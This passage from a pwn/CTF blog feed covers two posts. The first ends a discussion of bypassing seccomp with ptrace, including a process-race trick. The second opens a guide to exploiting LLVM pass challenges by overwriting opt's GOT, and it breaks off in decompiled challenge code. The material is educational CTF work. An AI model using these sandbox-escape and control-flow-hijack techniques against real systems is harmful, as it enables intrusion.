class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We can return 0 to resume the syscall or anything else to go to phase</span></span><br><span class="line"><span class="comment"> * 2.  If we resume the syscall, we need to put something appropriate in</span></span><br><span class="line"><span class="comment"> * regs-&gt;orig_ax.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * NB: We don&#x27;t have full pt_regs here, but regs-&gt;orig_ax and regs-&gt;ax</span></span><br><span class="line"><span class="comment"> * are fully functional.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * For phase 2&#x27;s benefit, our return value is:</span></span><br><span class="line"><span class="comment"> * 0:resume the syscall</span></span><br><span class="line"><span class="comment"> * 1:go to phase 2; no seccomp phase 2 needed</span></span><br><span class="line"><span class="comment"> * anything else:go to phase 2; pass return value to seccomp</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">syscall_trace_enter_phase1</span><span class="params">(<span class="keyword">struct</span> pt_regs *regs, u32 arch)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread_info</span> *<span class="title">ti</span> =</span> pt_regs_to_thread_info(regs);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> ret = <span class="number">0</span>;</span><br><span class="line">u32 work;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (IS_ENABLED(CONFIG_DEBUG_ENTRY))</span><br><span class="line">BUG_ON(regs != task_pt_regs(current));</span><br><span class="line"></span><br><span class="line">work = ACCESS_ONCE(ti-&gt;flags) &amp; _TIF_WORK_SYSCALL_ENTRY;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECCOMP</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Do seccomp first -- it should minimize exposure of other</span></span><br><span class="line"><span class="comment"> * code, and keeping seccomp fast is probably more valuable</span></span><br><span class="line"><span class="comment"> * than the rest of this.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (work &amp; _TIF_SECCOMP) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seccomp_data</span> <span class="title">sd</span>;</span></span><br><span class="line"></span><br><span class="line">sd.arch = arch;</span><br><span class="line">sd.nr = regs-&gt;orig_ax;</span><br><span class="line">sd.instruction_pointer = regs-&gt;ip;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_X86_64</span></span><br><span class="line"><span class="keyword">if</span> (arch == AUDIT_ARCH_X86_64) &#123;</span><br><span class="line">sd.args[<span class="number">0</span>] = regs-&gt;di;</span><br><span class="line">sd.args[<span class="number">1</span>] = regs-&gt;si;</span><br><span class="line">sd.args[<span class="number">2</span>] = regs-&gt;dx;</span><br><span class="line">sd.args[<span class="number">3</span>] = regs-&gt;r10;</span><br><span class="line">sd.args[<span class="number">4</span>] = regs-&gt;r8;</span><br><span class="line">sd.args[<span class="number">5</span>] = regs-&gt;r9;</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#123;</span><br><span class="line">sd.args[<span class="number">0</span>] = regs-&gt;bx;</span><br><span class="line">sd.args[<span class="number">1</span>] = regs-&gt;cx;</span><br><span class="line">sd.args[<span class="number">2</span>] = regs-&gt;dx;</span><br><span class="line">sd.args[<span class="number">3</span>] = regs-&gt;si;</span><br><span class="line">sd.args[<span class="number">4</span>] = regs-&gt;di;</span><br><span class="line">sd.args[<span class="number">5</span>] = regs-&gt;bp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BUILD_BUG_ON(SECCOMP_PHASE1_OK != <span class="number">0</span>);</span><br><span class="line">BUILD_BUG_ON(SECCOMP_PHASE1_SKIP != <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">ret = seccomp_phase1(&amp;sd);</span><br><span class="line"><span class="keyword">if</span> (ret == SECCOMP_PHASE1_SKIP) &#123;</span><br><span class="line">regs-&gt;orig_ax = <span class="number">-1</span>;</span><br><span class="line">ret = <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (ret != SECCOMP_PHASE1_OK) &#123;</span><br><span class="line"><span class="keyword">return</span> ret;  <span class="comment">/* Go directly to phase 2 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">work &amp;= ~_TIF_SECCOMP;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Do our best to finish without phase 2. */</span></span><br><span class="line"><span class="keyword">if</span> (work == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> ret;  <span class="comment">/* seccomp and/or nohz only (ret == 0 here) */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_AUDITSYSCALL</span></span><br><span class="line"><span class="keyword">if</span> (work == _TIF_SYSCALL_AUDIT) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If there is no more work to be done except auditing,</span></span><br><span class="line"><span class="comment"> * then audit in phase 1.  Phase 2 always audits, so, if</span></span><br><span class="line"><span class="comment"> * we audit here, then we can&#x27;t go on to phase 2.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">do_audit_syscall_entry(regs, arch);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;  <span class="comment">/* Something is enabled that we can&#x27;t handle in phase 1 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Returns the syscall nr to run (which should match regs-&gt;orig_ax). */</span></span><br><span class="line"><span class="type">long</span> <span class="title function_">syscall_trace_enter_phase2</span><span class="params">(<span class="keyword">struct</span> pt_regs *regs, u32 arch,</span></span><br><span class="line"><span class="params"><span class="type">unsigned</span> <span class="type">long</span> phase1_result)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread_info</span> *<span class="title">ti</span> =</span> pt_regs_to_thread_info(regs);</span><br><span class="line"><span class="type">long</span> ret = <span class="number">0</span>;</span><br><span class="line">u32 work = ACCESS_ONCE(ti-&gt;flags) &amp; _TIF_WORK_SYSCALL_ENTRY;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (IS_ENABLED(CONFIG_DEBUG_ENTRY))</span><br><span class="line">BUG_ON(regs != task_pt_regs(current));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECCOMP</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Call seccomp_phase2 before running the other hooks so that</span></span><br><span class="line"><span class="comment"> * they can see any changes made by a seccomp tracer.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (phase1_result &gt; <span class="number">1</span> &amp;&amp; seccomp_phase2(phase1_result)) &#123;</span><br><span class="line"><span class="comment">/* seccomp failures shouldn&#x27;t expose any additional code. */</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(work &amp; _TIF_SYSCALL_EMU))</span><br><span class="line">ret = <span class="number">-1L</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((ret || test_thread_flag(TIF_SYSCALL_TRACE)) &amp;&amp;</span><br><span class="line">    tracehook_report_syscall_entry(regs))</span><br><span class="line">ret = <span class="number">-1L</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(test_thread_flag(TIF_SYSCALL_TRACEPOINT)))</span><br><span class="line">trace_sys_enter(regs, regs-&gt;orig_ax);</span><br><span class="line"></span><br><span class="line">do_audit_syscall_entry(regs, arch);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret ?: regs-&gt;orig_ax;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>对<code>seccomp</code> 的处理在 <code>syscall_trace_enter_phase1</code>， 而处理<code>ptrace</code>的<code>tracehook_report_syscall_entry</code> 在<code>syscall_trace_enter_phase2</code></p><p>seccomp的过滤在ptrace之前。</p><p>所以，在4.8以下，这种攻击是可以实现的。</p><h2 id="Tricks">Tricks</h2><p>那么ptrace在绕过沙箱时是不是完全没有用了呢，也不是。</p><p>在和@cnitlrt 师傅交流后，得知了一个很骚操作的办法。</p><p>使用nc 连接两次，产生了两个进程，如果能在第二个进程运行前，通过ptrace截停prctl的调用，改成随便一个无关调用，就可以实现沙盒的绕过</p><p>这里存在三个问题：</p><p>首先是如何获得第二个进程的pid： 在CTF这种比较纯净的环境，可以认为两个进程PID相近，把当前进程的PID加1或者加2就可以。</p><p>其次是如何实现在第二次进程运行seccomp前的窗口期实现ptrace上此进程： 可以通过在一个进程使用ptrace attach轮询，直到执行成功返回1。不过也有失败的概率。</p><p>第三也是最终限制了这个tricks的使用的是，我们都知道，ptrace默认只能attach到自己的子进程，除非 <code>/proc/sys/kernel/yama/ptrace_scope</code> 设置为0， 在个人用户使用时，为了方便gdb等调试器，这个选项一般是0， 然而，当我随便开了个ubuntu的docker看了一下后：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> proc/sys/kernel/yama/ptrace_scope</span>  </span><br><span class="line">1</span><br></pre></td></tr></table></figure><p>啊这，这，那没事了</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Background&quot;&gt;Background&lt;/h2&gt;
&lt;p&gt;最近ACTF出现了一个限制非常严格的沙箱，校队里一位pwn师傅搜到了一些用ptrace修改子进程rax来绕过seccomp的wp。&lt;/p&gt;
&lt;p&gt;正值校赛，为了出题的事忙得焦头烂额，就没有细想。&lt;/p&gt;
&lt;p&gt;但是由于我记得seccomp 是内核hook，而ptrace， 出于一些对调试器的映像，我觉得他对于attach的子进程的寄存器的更改，&lt;s&gt;是在用户态实现的&lt;/s&gt;。 那么ptrace的处理应该在seccomp之前，所以我觉得不太可行。&lt;/p&gt;
&lt;p&gt;在有时间后，我开始探究了一下，确实不太可行，只是原因跟我想象得不太一样…&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://v3rdant.cn/categories/CTF/"/>
    
    
    <category term="Pwn" scheme="https://v3rdant.cn/tags/Pwn/"/>
    
    <category term="linux" scheme="https://v3rdant.cn/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>I wanna be a llvm passer</title>
    <link href="https://v3rdant.cn/Pwn.I-Wanna-be-A-LLVM-Passer/"/>
    <id>https://v3rdant.cn/Pwn.I-Wanna-be-A-LLVM-Passer/</id>
    <published>2023-06-22T16:00:00.000Z</published>
    <updated>2024-01-12T13:06:54.961Z</updated>
    
    <content type="html"><![CDATA[<h1 id="overview">overview</h1><p>华中赛遇到了一个llvm的题，顺手系统总结一下llvm pass吧。</p><p>首先简单介绍一下llvm，llvm是一套用C++编写的编译器基础设施。LLVM Pass提供了一些可供重写的函数，本义是用来实现一些优化。而Pwn的llvm pass类题，就是重写了runOnFunction函数。</p><span id="more"></span><p>ll和bc是llvm生成的IR的两种形式，分别是适合人类阅读的文本形式和二进制形式，可以用如下命令转换。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.c -&gt; .ll：clang -emit-llvm -S a.c -o a.ll</span><br><span class="line">.c -&gt; .bc: clang -emit-llvm -c a.c -o a.bc</span><br><span class="line">.ll -&gt; .bc: llvm-as a.ll -o a.bc</span><br><span class="line">.bc -&gt; .ll: llvm-dis a.bc -o a.ll</span><br><span class="line">.bc -&gt; .s: llc a.bc -o a.s</span><br></pre></td></tr></table></figure><p>由于笔者实机为Fedora, 所以笔者使用ubuntu docker 来安装llvm和clang，在需要调试时，<s>将相应共享库导入到本地，用patchelf来更改软链接</s>，还是在docker中配置调试环境比较方便.jpg</p><p>启动一个ubuntu:20.04的container，如下安装并配置好调试环境即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install clang-8</span><br><span class="line">sudo apt install llvm-8</span><br><span class="line"> </span><br><span class="line">sudo apt install clang-10</span><br><span class="line">sudo apt install llvm-10</span><br><span class="line"> </span><br><span class="line">sudo apt install clang-12</span><br><span class="line">sudo apt install llvm-12</span><br></pre></td></tr></table></figure><p>opt就是所要pwn掉的对象，他是llvm的优化器，可以加载指定pass模块和exp对应ll代码，由于opt一般无PIE保护，所以一般通过覆盖got表来实现劫持控制流。自己安装的opt路径为<code>/usr/lib/llvm-xx/bin/opt</code></p><h1 id="so分析">so分析</h1><p>如何定位重写的 runOnFunction 函数呢?<br>首先定位到<code>.data.rel.ro</code> 段的vtable，其最后一项就是此函数。<br><img src="/images/20230630154515.png" alt="1"></p><p>另一种定位方法：</p><ul><li>首先找到注册的Pass的字符串。<br>这里IDA没有自动识别，将Hello字符串更改类型并命名<br><img src="images/20230630154611.png" alt><br>然后通过交叉引用找到Pass注册函数<br><img src="/images/20230630154751.png" alt><br>跟进sub_7e10<br><img src="/images/20230630155104.png" alt><br>跟进sub_7F90<br><img src="/images/20230630155140.png" alt><br>继续跟进<br><img src="images/20230630155156.png" alt></li></ul><p>此处unk_FD48即为虚表地址。</p><h2 id="函数对照">函数对照</h2><ul><li>getName()：获取当前处理的函数名</li><li>getOpcodeName()：获取操作符名称</li><li>getOpcodeName()函数用于获取指令的操作符的名称</li><li>getNumOperands()用于获取指令的操作数的个数</li><li>getOpcode()函数用于获取指令的操作符编号，在/usr/include/llvm-xx/llvm/IR/Instruction.def可以找到编号和操作符的对应表</li><li>getOperand(i)是用于获取第i个操作数（在这里就是获取所调用函数的第i个参数），getArgOperand()函数与其用法类似，但只能获取参数，getZExtValue()即get Zero Extended Value，也就是将获取的操作数转为无符号扩展整数。</li></ul><h1 id="调试">调试</h1><p>调试实际上是调试opt，所以采用如下方法调试即可:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb ./opt</span><br></pre></td></tr></table></figure><p>先用gdb调试opt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set args -load ./&lt;pass so name&gt;.so -&lt;pass name&gt; exp.ll</span><br><span class="line">start</span><br></pre></td></tr></table></figure><p>再设置参数加载pass</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n &lt;一系列call指令数&gt;</span><br></pre></td></tr></table></figure><p>在开始的200左右个call指令后，pass.so才会加载进内存</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b *&lt;pass加载地址&gt;+&lt;偏移&gt;</span><br></pre></td></tr></table></figure><h2 id="注意事项">注意事项</h2><ol><li><strong>heap</strong></li></ol><p>由于opt是一个较为复杂的软件，运行过程中，存在相当多的无关chunk的分配，而且，由于exp.ll会被加载进入内存，即使exp变动的很小，chunk布局也可能会发生改变，因此需要小心注意chunk之间的偏移，可以考虑预先多分配一些chunk填充，方便之后更改偏移。</p><ol start="2"><li><strong>got</strong><br>如何选择覆写的got表？</li></ol><p>首先通过调用链确定runOnFunction 的调用位置。<br><img src="images/20230630161150.png" alt></p><p>然后通过<code>finish</code> 返回到main后，查找后面使用到的got表即可</p><h1 id="example">example</h1><h2 id="2023-ciscn-huazhong-lvm">2023-ciscn-huazhong-lvm</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_8050</span><span class="params">(__int64 a1, llvm::Function *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  llvm::BasicBlock *v3; <span class="comment">// rax</span></span><br><span class="line">  llvm::BasicBlock *v4; <span class="comment">// rax</span></span><br><span class="line">  llvm::Instruction *v5; <span class="comment">// rax</span></span><br><span class="line">  llvm::Value *CalledFunction; <span class="comment">// rax</span></span><br><span class="line">  __int64 v7; <span class="comment">// rdx</span></span><br><span class="line">  __int64 ArgOperand; <span class="comment">// rax</span></span><br><span class="line">  llvm::ConstantInt *v9; <span class="comment">// rax</span></span><br><span class="line">  __int64 v10; <span class="comment">// rax</span></span><br><span class="line">  __int64 v11; <span class="comment">// rax</span></span><br><span class="line">  llvm::User *v12; <span class="comment">// rax</span></span><br><span class="line">  __int64 v13; <span class="comment">// rax</span></span><br><span class="line">  llvm::ConstantInt *v14; <span class="comment">// rax</span></span><br><span class="line">  llvm::User *v15; <span class="comment">// rax</span></span><br><span class="line">  __int64 v16; <span class="comment">// rax</span></span><br><span class="line">  llvm::ConstantInt *v17; <span class="comment">// rax</span></span><br><span class="line">  __int64 v18; <span class="comment">// rax</span></span><br><span class="line">  llvm::ConstantInt *v19; <span class="comment">// rax</span></span><br><span class="line">  __int64 v20; <span class="comment">// rax</span></span><br><span class="line">  llvm::ConstantInt *v21; <span class="comment">// rax</span></span><br><span class="line">  llvm::User *v22; <span class="comment">// rax</span></span><br><span class="line">  __int64 v23; <span class="comment">// rax</span></span><br><span class="line">  llvm::ConstantInt *v24; <span class="comment">// rax</span></span><br><span class="line">  __int64 v25; <span class="comment">// rax</span></span><br><span class="line">  llvm::ConstantInt *v26; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v28; <span class="comment">// [rsp+Eh] [rbp-182h]</span></span><br><span class="line">  <span class="type">char</span> v29; <span class="comment">// [rsp+Fh] [rbp-181h]</span></span><br><span class="line">  <span class="type">int</span> v30; <span class="comment">// [rsp+10h] [rbp-180h]</span></span><br><span class="line">  <span class="type">int</span> v31; <span class="comment">// [rsp+14h] [rbp-17Ch]</span></span><br><span class="line">  __int64 v32; <span class="comment">// [rsp+18h] [rbp-178h] BYREF</span></span><br><span class="line">  __int64 v33; <span class="comment">// [rsp+20h] [rbp-170h] BYREF</span></span><br><span class="line">  __int64 v34[<span class="number">2</span>]; <span class="comment">// [rsp+28h] [rbp-168h] BYREF</span></span><br><span class="line">  __int64 v35; <span class="comment">// [rsp+38h] [rbp-158h]</span></span><br><span class="line">  __int64 v36; <span class="comment">// [rsp+40h] [rbp-150h]</span></span><br><span class="line">  __int64 v37[<span class="number">2</span>]; <span class="comment">// [rsp+48h] [rbp-148h] BYREF</span></span><br><span class="line">  __int64 v38; <span class="comment">// [rsp+58h] [rbp-138h]</span></span><br><span class="line">  __int64 v39; <span class="comment">// [rsp+60h] [rbp-130h]</span></span><br><span class="line">  <span class="type">int</span> v40; <span class="comment">// [rsp+6Ch] [rbp-124h]</span></span><br><span class="line">  <span class="type">int</span> v41; <span class="comment">// [rsp+70h] [rbp-120h]</span></span><br><span class="line">  <span class="type">int</span> v42; <span class="comment">// [rsp+74h] [rbp-11Ch]</span></span><br><span class="line">  __int64 v43; <span class="comment">// [rsp+78h] [rbp-118h] BYREF</span></span><br><span class="line">  __int64 v44; <span class="comment">// [rsp+80h] [rbp-110h] BYREF</span></span><br><span class="line">  __int64 v45; <span class="comment">// [rsp+88h] [rbp-108h] BYREF</span></span><br><span class="line">  __int64 v46[<span class="number">2</span>]; <span class="comment">// [rsp+90h] [rbp-100h] BYREF</span></span><br><span class="line">  __int64 v47; <span class="comment">// [rsp+A0h] [rbp-F0h]</span></span><br><span class="line">  __int64 v48; <span class="comment">// [rsp+A8h] [rbp-E8h]</span></span><br><span class="line">  <span class="type">int</span> v49; <span class="comment">// [rsp+B4h] [rbp-DCh]</span></span><br><span class="line">  __int64 v50; <span class="comment">// [rsp+B8h] [rbp-D8h] BYREF</span></span><br><span class="line">  _QWORD v51[<span class="number">2</span>]; <span class="comment">// [rsp+C0h] [rbp-D0h] BYREF</span></span><br><span class="line">  __int64 v52; <span class="comment">// [rsp+D0h] [rbp-C0h]</span></span><br><span class="line">  __int64 v53; <span class="comment">// [rsp+D8h] [rbp-B8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+E4h] [rbp-ACh]</span></span><br><span class="line">  <span class="type">void</span> *v55; <span class="comment">// [rsp+E8h] [rbp-A8h]</span></span><br><span class="line">  <span class="type">int</span> ZExtValue; <span class="comment">// [rsp+F4h] [rbp-9Ch]</span></span><br><span class="line">  __int64 Operand; <span class="comment">// [rsp+F8h] [rbp-98h] BYREF</span></span><br><span class="line">  _QWORD v58[<span class="number">2</span>]; <span class="comment">// [rsp+100h] [rbp-90h] BYREF</span></span><br><span class="line">  __int64 v59; <span class="comment">// [rsp+110h] [rbp-80h]</span></span><br><span class="line">  __int64 v60; <span class="comment">// [rsp+118h] [rbp-78h]</span></span><br><span class="line">  __int64 Name; <span class="comment">// [rsp+120h] [rbp-70h]</span></span><br><span class="line">  __int64 v62; <span class="comment">// [rsp+128h] [rbp-68h]</span></span><br><span class="line">  llvm::CallBase *v63; <span class="comment">// [rsp+130h] [rbp-60h]</span></span><br><span class="line">  __int64 v64; <span class="comment">// [rsp+138h] [rbp-58h] BYREF</span></span><br><span class="line">  __int64 v65; <span class="comment">// [rsp+140h] [rbp-50h] BYREF</span></span><br><span class="line">  __int64 v66; <span class="comment">// [rsp+148h] [rbp-48h] BYREF</span></span><br><span class="line">  __int64 v67; <span class="comment">// [rsp+150h] [rbp-40h] BYREF</span></span><br><span class="line">  __int64 v68; <span class="comment">// [rsp+158h] [rbp-38h] BYREF</span></span><br><span class="line">  _QWORD v69[<span class="number">3</span>]; <span class="comment">// [rsp+160h] [rbp-30h] BYREF</span></span><br><span class="line">  